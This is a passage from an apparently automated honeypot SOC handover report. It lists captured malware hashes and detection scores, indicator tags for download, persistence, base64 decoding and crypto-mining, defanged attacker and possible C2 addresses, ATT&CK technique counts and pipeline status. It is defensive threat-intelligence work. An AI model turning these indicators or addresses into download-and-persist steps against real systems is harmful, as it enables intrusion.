| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `187b67e5e2116293144f4009b1f224ed09eea924dd4ade00741a66792a63b45a` | ELF Binary (Linux executable) (x86-64 64-bit) | `187b67e5e2116293...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `77.90.185[.]29` | LT | Limited Network LTD | **100** ⚠️ | 16 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `195.178.110[.]78` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 8 |
| `45.148.10[.]61` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `138.226.239[.]234` | NL | Vlad Cojuhari | **100** ⚠️ | 50 |
| `199.165.159[.]209` | US | The Shadowserver Foundation, Inc. | **100** ⚠️ | 10 |
| `80.94.95[.]118` | RO | UNMANAGED LTD | **100** ⚠️ | 50 |
| `103.177.111[.]164` | VN | ADNS CO., LTD | **100** ⚠️ | 17 |
| `150.5.146[.]193` | HK | BYTEPLUS | **100** ⚠️ | 4 |
| `178.128.72[.]52` | US | DigitalOcean, LLC | **100** ⚠️ | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1078](https://attack.mitre.org/techniques/T1078) | 47 |
| [T1592](https://attack.mitre.org/techniques/T1592) | 41 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 12 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 9 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 4 |

---

## 🔕 False Positive Summary (23 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 11 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 12 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 3 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 84 cases |
| Tool 34  | Credential Extractor        | ✅ 465 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 15 fingerprints |
| Tool 36  | Command Clustering          | ✅ 10 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 56 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 23 filtered (27.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 28 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 39 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 38 priority case(s) shown individually · 21 recon entry/entries in table (2 group(s) consolidating 4 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-20T04:46:50Z_
